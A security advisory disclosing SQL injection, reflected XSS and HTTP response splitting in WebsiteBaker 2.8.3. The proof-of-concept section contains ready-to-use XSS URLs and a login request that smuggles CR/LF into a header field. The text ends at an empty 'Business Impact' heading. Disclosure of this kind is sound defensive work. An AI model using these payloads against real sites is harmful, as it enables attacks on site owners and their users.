- Severity: 10/10 (CVSS Base Score)
=============================================

I. VULNERABILITY
-------------------------
Multiple Vulnerabilities in WebsiteBaker 2.8.3

II. BACKGROUND
-------------------------
WebsiteBaker helps you to create the website you want: A free, easy and
secure, flexible and extensible open source content management system (CMS).

III. DESCRIPTION
-------------------------
It is possible to inject SQL code in the variable "id" on the page
"modify.php". This bug was found using the portal without authentication.
To exploit the vulnerability only is needed use the version 1.0 of the HTTP
protocol to interact with the application.
Has been detected a reflected XSS vulnerability in WebsiteBaker, that
allows the execution of arbitrary HTML/script code to be executed in the
context of the victim user's browser.
An input validation problem exists within WebsiteBaker which allows
injecting CR (carriage return - %0D or \r) and LF (line feed - %0A or \n)
characters into the server HTTP response header, resulting in a HTTP
Response Splitting Vulnerability.

IV. PROOF OF CONCEPT
-------------------------
SQL Injection:

/wb/admin/pages/modify.php?page_id=1

Cross-Site Scripting GET:

/wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1
/wb/modules/edit_module_files.php?page_id=1&mod_dir=news&edit_file=frontend.css&action=edit&page_id=1&section_id=%007e393<script>alert(1)</script>9f8a40a7355f9acf0
/wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f
/wb/modules/news/modify_group.php?page_id=1&section_id=%008cf03"><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3
/wb/modules/news/modify_post.php?page_id=1&section_id=%003874a<script>alert(1)</script>4194d511605&post_id=db89943875a2db52
/wb/modules/news/modify_settings.php?page_id=1&section_id=%008b2f4"><script>alert(1)</script>bdc8b3919b5

HTTP RESPONSE SPLITTING:

If you enter a valid user and password, you can inject on the headers
malicious code, example.

POST /wb/admin/login/index.php HTTP/1.1
Content-Length: 204
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.244.129:80/wb/
Host: 127.0.0.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: */*

password_fieldname=password_nwh1uuwb&password_nwh1uuwb=VALIDPASS&remember=true&submit=Entrar&
url=%0d%0a%20InjectedHeader:MaliciousCode&username_fieldname=username_nwh1uuwb&username_nwh1uuwb=adminResponse

You can inject a new header named: InjectedHeader:MaliciousCode because we
inject a CR&LF new line with %0d%0a%20.

V. BUSINESS IMPACT
